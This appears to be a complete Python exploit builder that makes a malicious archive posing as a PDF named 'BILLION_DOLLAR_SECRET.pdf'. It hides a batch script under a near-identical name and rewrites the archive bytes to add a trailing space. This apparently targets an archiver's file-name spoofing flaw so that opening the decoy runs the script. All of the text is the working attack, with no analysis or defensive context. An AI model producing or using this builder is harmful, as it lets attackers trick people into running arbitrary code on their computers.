import shutil
import os

SNEAKY_SCRIPT = "super_sneaky_evil_script.bat"
HOOK = "BILLION_DOLLAR_SECRET.pdf"
PLACEHOLDER = "PLACEHOLDER"
OP = "BILLION_DOLLAR_SECRET.rar"
HOOK_EXTENSION = b"." + HOOK.split(".")[-1].encode("utf-8")

if os.path.exists(PLACEHOLDER):
    shutil.rmtree(PLACEHOLDER, ignore_errors=True)

os.mkdir(PLACEHOLDER)
SUB_DIRECTORY = os.path.join(PLACEHOLDER, HOOK + "A")
os.mkdir(SUB_DIRECTORY)
shutil.copy(SNEAKY_SCRIPT, os.path.join(SUB_DIRECTORY, HOOK + "A.cmd"))
shutil.copy(HOOK, os.path.join(PLACEHOLDER, HOOK + "B"))
shutil.make_archive(PLACEHOLDER, 'zip', PLACEHOLDER)

with open(PLACEHOLDER + ".zip", "rb") as f:
    content = f.read()
    content = content.replace(HOOK_EXTENSION + b"A", HOOK_EXTENSION + b" ").replace(HOOK_EXTENSION + b"B", HOOK_EXTENSION + b" ")

os.remove(PLACEHOLDER + ".zip")

with open(OP, "wb") as f:
    f.write(content)